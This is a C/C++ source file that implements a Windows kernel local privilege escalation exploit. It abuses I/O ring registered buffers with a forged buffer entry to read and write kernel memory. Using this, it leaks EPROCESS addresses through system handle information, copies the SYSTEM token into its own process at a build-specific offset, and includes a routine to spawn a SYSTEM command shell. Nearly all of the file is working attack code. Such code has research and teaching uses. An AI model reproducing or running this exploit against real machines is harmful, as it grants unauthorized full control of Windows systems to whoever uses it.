#include "ioring.h"
#include <iostream>
#include <stdlib.h>

HRESULT result;
QWORD ObjectAddress;
HIORING hIoRing = NULL;
_HIORING* pHandle = NULL;
PIORING_OBJECT pIoRing = NULL;
IORING_CREATE_FLAGS flags;

HANDLE inputPipe = INVALID_HANDLE_VALUE;
HANDLE outputPipe = INVALID_HANDLE_VALUE;
HANDLE inputClientPipe = INVALID_HANDLE_VALUE;
HANDLE outputClientPipe = INVALID_HANDLE_VALUE;

QWORD GetKernelBase() {
    
    DWORD len;
    NTSTATUS status;
    PRTL_PROCESS_MODULES ModuleInfo = nullptr;
    HRESULT result;
    PVOID kernelBase = NULL;
    ULONG kernelSize = NULL;

    NtQuerySystemInformation(SystemModuleInformation, NULL, 0, &len);
    
    ModuleInfo = (PRTL_PROCESS_MODULES)VirtualAlloc(NULL, len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!ModuleInfo) {
        return NULL;
    }
    
    NtQuerySystemInformation(SystemModuleInformation, ModuleInfo, len, &len);
    
    kernelBase = ModuleInfo->Modules[0].ImageBase;
    kernelSize = ModuleInfo->Modules[0].ImageSize;
    
    VirtualFree(ModuleInfo, 0, MEM_RELEASE);
    
    return (QWORD)kernelBase, (QWORD)kernelSize;
}

QWORD QueryObjectByPointer(HANDLE Handle, DWORD pid) {
    
    NTSTATUS status;
    HRESULT hResult;
    ULONG bytes;
    ULONG i;
    ULONG ioringTypeIndex;
    SYSTEM_HANDLE_INFORMATION localInfo;
    PSYSTEM_HANDLE_INFORMATION handleInfo = &localInfo;

    status = NtQuerySystemInformation(SystemHandleInformation, handleInfo, sizeof(*handleInfo), &bytes);
    if (NT_SUCCESS(status))
    {
        printf("[-] NtQuerySystemInformation failed : 0x%llX\n", status);
        hResult = ERROR_UNIDENTIFIED_ERROR;
        return NULL;
    }
    //
    // Add space for 100 more handles and try again
    //
    bytes += 100 * sizeof(*handleInfo);
    handleInfo = (PSYSTEM_HANDLE_INFORMATION)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, bytes);
    
    status = NtQuerySystemInformation(SystemHandleInformation, handleInfo, bytes, &bytes);
    if (!NT_SUCCESS(status) || !handleInfo)
    {
        hResult = HRESULT_FROM_NT(status);
        printf("[-] NtQuerySystemInformation #2 failed: 0x%llX\n", status);
        return NULL;
    }
    
    printf("\n[+] Handle: 0x%llX\n", Handle);
    
    for (i = 0; i < handleInfo->NumberOfHandles; i++)
    {
        //
        // Check if this is the correct I/O ring handle
        //
        if ((handleInfo->Handles[i].UniqueProcessId == pid) &&
            ((HANDLE)handleInfo->Handles[i].HandleValue == Handle))
        {
            return (QWORD)handleInfo->Handles[i].Object;
        }
    }
    return false;
}

QWORD setupIORing() {
    
    // Create an I/O ring and get the object address
    flags.Required = IORING_CREATE_REQUIRED_FLAGS_NONE;
    flags.Advisory = IORING_CREATE_ADVISORY_FLAGS_NONE;

    // Clear hIoRing
    memset(&hIoRing, 0, sizeof(hIoRing));

    result = CreateIoRing(IORING_VERSION_3, flags, 0x10000, 0x20000, &hIoRing);
    if (!SUCCEEDED(result)) {
        printf("[-] Failed creating IO ring handle: 0x%llX\n", result);
        return NULL;
    }
      
    printf("[+] CreateIoRing SUCCEED!\n");

    ObjectAddress = QueryObjectByPointer(*(PHANDLE)hIoRing, GetCurrentProcessId());
    if (!ObjectAddress) {
        printf("Failed finding I/O ring object address: 0x%llX\n", ObjectAddress);
        return NULL;
    }

    printf("[+] Found I/O ring address pointer! 0x%llX\n", ObjectAddress);
    return ObjectAddress;
}

BOOL ioring_read(LPVOID pFakeRegBuffers, LPVOID pReadAddr, PVOID pDummyReadBuffer, DWORD pReadLen) {

    int status;
    PIOP_MC_BUFFER_ENTRY pMcBufferEntry = NULL;
    IORING_HANDLE_REF reqFile = IoRingHandleRefFromHandle(outputClientPipe);
    IORING_BUFFER_REF reqBuffer = IoRingBufferRefFromIndexAndOffset(0, 0);
    IORING_CQE cqe = { 0 };

    pMcBufferEntry = (PIOP_MC_BUFFER_ENTRY)VirtualAlloc(NULL, sizeof(IOP_MC_BUFFER_ENTRY), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    pMcBufferEntry->Address = (LPVOID)pReadAddr;
    pMcBufferEntry->Length = pReadLen;
    pMcBufferEntry->Type = 0xc02;
    pMcBufferEntry->Size = 0x80;
    pMcBufferEntry->AccessMode = 1;
    pMcBufferEntry->ReferenceCount = 1;

    *(LPVOID*)pFakeRegBuffers = pMcBufferEntry; // Send our crafted struct to fakeRegBuffers 0x100000
    
    printf("\t'-> hIoring: %p -> %llX\n", hIoRing);
    status = BuildIoRingWriteFile(hIoRing, reqFile, reqBuffer, pReadLen, 0, FILE_WRITE_FLAGS_NONE, NULL, IOSQE_FLAGS_NONE);
    
    if (status != 0) {
        printf("[-] [BuildIoRingWriteFile] [0x%llX] (ioring_read) -> Failed!\n", status);
        return NULL;
    }

    status = SubmitIoRing(hIoRing, 0, 0, NULL);
    if (status != 0) {
        printf("[-] [SubmitIoRing] (ioring_read) -> Failed!\n");
        return NULL;
    }

    status = PopIoRingCompletion(hIoRing, &cqe);
    if (cqe.ResultCode != 0){
        printf("[-] [ceq.ResultCode] (ioring_read) -> Failed!\n");
        return NULL;
    }

    status = ReadFile(outputPipe, pDummyReadBuffer, pReadLen, NULL, NULL);
    if (status == 0) {
        printf("[-] [ReadFile] (ioring_read) -> Failed\n");
        return NULL;
    }
    else {
        printf("[+] TOKEN IS AT: 0x%llx\n", pDummyReadBuffer);
    }

    return true;
}

BOOL ioring_write(LPVOID pFakeRegBuffers, LPVOID pWriteAddr, LPVOID pDummyReadBuffer, DWORD pWriteLen) {

    int status;
    PIOP_MC_BUFFER_ENTRY pMcBufferEntry = NULL;
    IORING_HANDLE_REF reqFile = IoRingHandleRefFromHandle(inputClientPipe);
    IORING_BUFFER_REF reqBuffer = IoRingBufferRefFromIndexAndOffset(0, 0);
    IORING_CQE cqe = { 0 };

    pMcBufferEntry = (PIOP_MC_BUFFER_ENTRY)VirtualAlloc(NULL, sizeof(IOP_MC_BUFFER_ENTRY), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    pMcBufferEntry->Address = (LPVOID)pWriteAddr;
    pMcBufferEntry->Length = pWriteLen;
    pMcBufferEntry->Type = 0xc02;
    pMcBufferEntry->Size = 0x80;
    pMcBufferEntry->AccessMode = 1;
    pMcBufferEntry->ReferenceCount = 1;
    
    *(LPVOID*)pFakeRegBuffers = pMcBufferEntry; // Crafted struct to our fakebuffers 0x1000000

    printf("\t'-> hIoRing: 0x%p -> 0x%llX\n", hIoRing);
    status = BuildIoRingReadFile(hIoRing, reqFile, reqBuffer, pWriteLen, 0, NULL, IOSQE_FLAGS_NONE);
    if (status != 0) {
        printf("[-] [BuildIoRingReadFile] (ioring_write) -> Failed!\n");
        return NULL;
    }

    status = SubmitIoRing(hIoRing, 0, 0, NULL);
    if (status != 0) {
        printf("[-] [SubmitIoRing] (ioring_write) -> Failed!\n");
        return NULL;
    }

    status = PopIoRingCompletion(hIoRing, &cqe);
    if (cqe.ResultCode != 0) {
        printf("[-] [ceq.ResultCode] (ioring_write) -> Failed!\n");
        return NULL;
    }

    status = WriteFile(inputPipe, pDummyReadBuffer, pWriteLen, NULL, NULL);
    if (status == 0) {
        printf("[-] [WriteFile] (ioring_write) -> Failed\n");
        return NULL;
    }

    return true;
}

//https://h0mbre.github.io/HEVD_Stackoverflow_SMEP_Bypass_64bit/
void spawn_shell() {
    std::cout << "\t\t[>] Spawning nt authority/system shell..." << std::endl;
    PROCESS_INFORMATION pi;
    ZeroMemory(&pi, sizeof(pi));
    STARTUPINFOA si;
    ZeroMemory(&si, sizeof(si));
    CreateProcessA("C:\\Windows\\System32\\cmd.exe",
        NULL,
        NULL,
        NULL,
        0,
        CREATE_NEW_CONSOLE,
        NULL,
        NULL,
        &si,
        &pi);
}

BOOL ioring_lpe(LPVOID pFakeRegBuffers) {

    int status = -1;
    HANDLE hProc = NULL;
    QWORD systemEPROC = 0;
    QWORD localEPROC = 0;
    _HIORING* phIoRing = NULL;
    LPVOID pDummyReadBuffer = 0;

    // Creating named PIPE with [PIPE_ACCESS_DUPLEX] bit
    outputPipe = CreateNamedPipe(L"\\\\.\\pipe\\ioring_out", PIPE_ACCESS_DUPLEX, PIPE_WAIT, 255, 0x1000, 0x1000, 0, NULL);
    inputPipe = CreateNamedPipe(L"\\\\.\\pipe\\ioring_in", PIPE_ACCESS_DUPLEX, PIPE_WAIT, 255, 0x1000, 0x1000, 0, NULL);
    if ((INVALID_HANDLE_VALUE == inputPipe) || (INVALID_HANDLE_VALUE == outputPipe)) {
        printf("[-] Couldn't create #1 [inputPipe/outputPipe]!\n");
        return NULL;
    }

    // Creating File Handle
    outputClientPipe = CreateFile(L"\\\\.\\pipe\\ioring_out", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    inputClientPipe = CreateFile(L"\\\\.\\pipe\\ioring_in", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if ((INVALID_HANDLE_VALUE == inputClientPipe) || (INVALID_HANDLE_VALUE == outputClientPipe)) {
        printf("[-] Couldn't create #2 [inputClientPipe/outputClientPipe]!\n");
        return NULL;
    }

    systemEPROC = QueryObjectByPointer((HANDLE)4, 4);
    if (!ObjectAddress) {
        printf("[-] Failed finding systemEPROC #1...\n", systemEPROC);
        return NULL;
    }

    printf("[+] Found systemEPROC address pointer: %llX\n\n", systemEPROC);
    LPVOID systemTokenOffset = (LPVOID)(systemEPROC + 0x4b8); // Windows 10/11h 22621

    memset(pFakeRegBuffers, 0, sizeof(QWORD));
    // Convert hIoRing (HIORING) struct to undocumented one (_HIORING),
    // which fixes the offset and enable us to insert our pfakeRegBuffers array
    phIoRing = *(_HIORING**)&hIoRing;
    phIoRing->RegBufferArray = pFakeRegBuffers;
    phIoRing->BufferArraySize = sizeof(pFakeRegBuffers);

    printf("\t'-> phIoRing: 0x%llX\n", &phIoRing);

    // Reading SYSTEM(4) token from [EPROC+0x4b8] to &pDummyReadBuffer
    status = ioring_read(pFakeRegBuffers, systemTokenOffset, &pDummyReadBuffer, sizeof(QWORD));
    if (!status) {
        printf("[-] Failed to read #2 tokenOffset!\n");
    };
    
    // Prompt the user for input
    printf("[!] Waiting for any key #1 -> [LPE]... \n");
    getchar();

    hProc = OpenProcess(PROCESS_QUERY_INFORMATION, 0, GetCurrentProcessId());
    if (hProc == 0) {
        printf("[-] Could not get hProc\n");
    }

    localEPROC = QueryObjectByPointer((HANDLE)hProc, GetCurrentProcessId());
    if (!ObjectAddress) {
        printf("[-] Failed finding localEPROC...\n", localEPROC);
        return NULL;
    }

    printf("[+] localEPROC: %llX\n", localEPROC);

    // Prompt the user for input
    printf("[!] Waiting for any key #2 -> [LPE]... \n");
    getchar();

    // Writing SYSTEM(4) token to our current process [EPROC+0x4b8]
    LPVOID localTokenOffset = (LPVOID)(localEPROC + 0x4b8); // Windows 10/11h 22621
    
    // Writing SYSTEM(4) token from pDummyReadBuffer to our current process [EPROC+0x4b8]
    status = ioring_write(pFakeRegBuffers, localTokenOffset, &pDummyReadBuffer, sizeof(QWORD));
    if (!status) {
        printf("[-] Failed to read #2 tokenOffset!\n");
    }

    return true;
}
